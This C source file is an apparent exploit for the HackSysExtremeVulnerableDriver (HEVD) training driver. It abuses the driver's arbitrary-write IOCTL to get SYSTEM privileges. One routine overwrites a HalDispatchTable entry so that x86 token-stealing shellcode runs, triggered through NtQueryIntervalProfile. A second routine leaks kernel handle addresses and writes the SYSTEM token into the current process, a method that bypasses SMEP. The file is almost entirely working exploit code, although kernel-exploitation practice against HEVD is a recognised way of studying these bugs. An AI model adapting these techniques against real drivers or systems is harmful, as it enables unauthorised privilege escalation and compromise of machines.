#include "ArbitraryWrite.h"

pNtQuerySystemInformation NtQuerySystemInformation = NULL;
pNtQueryIntervalProfile NtQueryIntervalProfile = NULL;
pNtQueryObject NtQueryObject = NULL;

int ArbitraryWriteExpShellcode(int a, int b, int c, int d){
#ifndef _WIN64
	__asm {
		pushad
		pushfd

		mov eax, fs: [0x124]
		mov eax, [eax + 0x150]
		mov edi, eax
	}

SearchSystem:
	__asm {
		mov eax, [eax + 0x0b8]
		sub eax, 0x0b8
		cmp[eax + 0x0b4], 4
		jne SearchSystem
	}

	__asm {
		mov esi, eax
		mov eax, [esi + 0x0f8]
		mov[edi + 0x0f8], eax

		popfd
		popad
	}
#endif
	return 0;
}

BOOL InitNtVar() {
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return NULL;

	NtQuerySystemInformation = GetProcAddress(hNtdll, "NtQuerySystemInformation");
	NtQueryIntervalProfile = GetProcAddress(hNtdll, "NtQueryIntervalProfile");
	NtQueryObject = GetProcAddress(hNtdll, "NtQueryObject");
	if (!NtQuerySystemInformation || !NtQueryIntervalProfile || !NtQueryObject) return FALSE;

	return TRUE;
}

PVOID FindKernelBase(PCHAR kernelName) {
	PRTL_PROCESS_MODULES nameBuffer = NULL;
	PRTL_PROCESS_MODULE_INFORMATION nameInfo = NULL;
	ULONG byteReturn = 0;
	PCHAR lastSlash = NULL;
	PVOID kernelBase = 0;
	NTSTATUS st = 0;

	nameBuffer = (PRTL_PROCESS_MODULES)malloc(0x10000);
	if (!nameBuffer) return NULL;

	st = NtQuerySystemInformation(
		SystemModuleInformation,
		nameBuffer,
		0x10000,
		&byteReturn
	);
	if (st < 0) {
		printf("[E] NtQuerySystemInformation Failed->%lX\n", st);
		return NULL;
	}

	nameInfo = &nameBuffer->Modules;
	for (ULONG i = 0; i < nameBuffer->NumberOfModules; i++) {
		if (strstr(nameInfo[i].FullPathName, "nt") && strstr(nameInfo[i].FullPathName, ".exe")) {
			kernelBase = nameInfo[i].ImageBase;
			lastSlash = strrchr(nameInfo[i].FullPathName, '\\');
			if (lastSlash)
				strcpy(kernelName, lastSlash + 1);
			free(nameBuffer);
			return kernelBase;
		}
	}

	free(nameBuffer);
	return NULL;
}

PVOID FindExport(PVOID kernelBase, PCHAR functionName, PCHAR kernelName) {
	HMODULE hKernelUserAddr = LoadLibraryA(kernelName);

	if (!kernelBase || !functionName) return NULL;
	if (!hKernelUserAddr) return NULL;

	PVOID functionUserAddr = (PVOID)GetProcAddress(hKernelUserAddr, functionName);
	if (!functionUserAddr) return NULL;

	return (PVOID)((SIZE_T)functionUserAddr - (SIZE_T)hKernelUserAddr + (SIZE_T)kernelBase);
}

BOOL ArbitraryWriteExp(HANDLE hDevice) {
	BOOL res = TRUE;
	ULONG byteReturn = 0;
	WRITE_WHAT_WHERE arbitWrite = { 0 };
	CHAR kernelName[MAX_PATH] = { 0 };
	ULONG writeAddr = ArbitraryWriteExpShellcode;
	PVOID kernelBase = NULL;
	PVOID kHalDispatchTable = NULL;

	kernelBase = FindKernelBase(kernelName);
	kHalDispatchTable = FindExport(kernelBase, "HalDispatchTable", kernelName);
	if (!kHalDispatchTable) return FALSE;

	printf("[W] HalDispatchTable Addr->%p\n", kHalDispatchTable);

	arbitWrite.Where = (PBYTE)kHalDispatchTable + sizeof(PVOID);
	arbitWrite.What = &writeAddr;
	res = DeviceIoControl(hDevice, HEVD_IOCTL_ARBITRARY_WRITE, &arbitWrite, sizeof(WRITE_WHAT_WHERE), NULL, 0, &byteReturn, NULL);
	NtQueryIntervalProfile(2, &byteReturn);
	return res;
}

BOOL ArbitraryWriteSEMPExp(HANDLE hDevice)
{
	ULONG returnLength = 0;
	PVOID systemToken = NULL;
	PVOID processObj = NULL;
	BOOL firstFound = FALSE;
	NTSTATUS st = 0;
	WRITE_WHAT_WHERE arbitWrite = { 0 };
	PVOID writeAddr = NULL;
	PVOID whereAddr = NULL;
	HANDLE hProcess = NULL;
	POBJECT_TYPES_INFORMATION typesInfo = NULL;
	POBJECT_TYPE_INFORMATION tInfo = NULL;
	UCHAR processTypeIndex = 0;
	UCHAR tokenTypeIndex = 0;

	PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)VirtualAlloc(
		NULL,
		HANDLE_INFO_SIZE,
		MEM_COMMIT,
		PAGE_READWRITE
	);
	if (!handleTableInformation) {
		printf("VirtualAlloc Failed\n");
		system("pause");
		return FALSE;
	}

	typesInfo = (POBJECT_TYPES_INFORMATION)VirtualAlloc(NULL, 
		OBJECT_TYPE_INFO_SIZE, 
		MEM_COMMIT, 
		PAGE_READWRITE
	);
	if (!typesInfo) {
		printf("VirtualAlloc Failed\n");
		return FALSE;
	}

	if (!InitNtVar()) return FALSE;
	
	st = NtQueryObject(NULL, ObjectTypesInformation, typesInfo, OBJECT_TYPE_INFO_SIZE, &returnLength);
	if (st < 0) {
		printf("NtQueryObject Failed\n");
		return FALSE;
	}
	
	tInfo = (POBJECT_TYPE_INFORMATION)&typesInfo->TypeInformation[0];
	for (LONG i = 0; i < typesInfo->NumberOfTypes; i++) {
		if (!wcscmp(tInfo->TypeName.Buffer, L"Process")) {
			processTypeIndex = tInfo->TypeIndex;
			printf("Process TypeIndex->%02X\n",processTypeIndex);
		}
		if (!wcscmp(tInfo->TypeName.Buffer, L"Token")) {
			tokenTypeIndex = tInfo->TypeIndex;
			printf("Token TypeIndex->%02X\n", tokenTypeIndex);

		}

		tInfo = (POBJECT_TYPE_INFORMATION)ALIGN_UP((PBYTE)tInfo + sizeof(OBJECT_TYPE_INFORMATION) + tInfo->TypeName.MaximumLength,ULONG_PTR);
	}

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	if (hProcess == INVALID_HANDLE_VALUE) return FALSE;

	st = NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, HANDLE_INFO_SIZE, &returnLength);
	if (st < 0) {
		printf("NtQuerySystemInformation Failed\n");
		system("pause");
		return FALSE;
	}

	for (ULONG i = 0; i < handleTableInformation->NumberOfHandles; i++)
	{
		PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handles[i];

		if (!systemToken && 
			handleInfo->UniqueProcessId == (USHORT)4 && 
			handleInfo->ObjectTypeIndex == tokenTypeIndex
		) {
			if (!firstFound) {
				firstFound = TRUE;
				continue;
			}
			else {
				systemToken = handleInfo->Object;
			}
		}

		if (handleInfo->UniqueProcessId == GetCurrentProcessId() && 
			handleInfo->HandleValue == hProcess && 
			handleInfo->ObjectTypeIndex == processTypeIndex
		) {
			processObj = handleInfo->Object;
		}
	}

	whereAddr = (PVOID)((PBYTE)processObj + OFFSET_TOKEN);
	writeAddr = systemToken;

	printf("where->%p what->%p\n", whereAddr, writeAddr);

	arbitWrite.Where = whereAddr;
	arbitWrite.What = &writeAddr;

	if (!DeviceIoControl(
		hDevice, 
		HEVD_IOCTL_ARBITRARY_WRITE, 
		&arbitWrite, 
		sizeof(WRITE_WHAT_WHERE), 
		NULL, 
		0, 
		&returnLength, 
		NULL
	)) {
		return FALSE;
	}

	return TRUE;
}
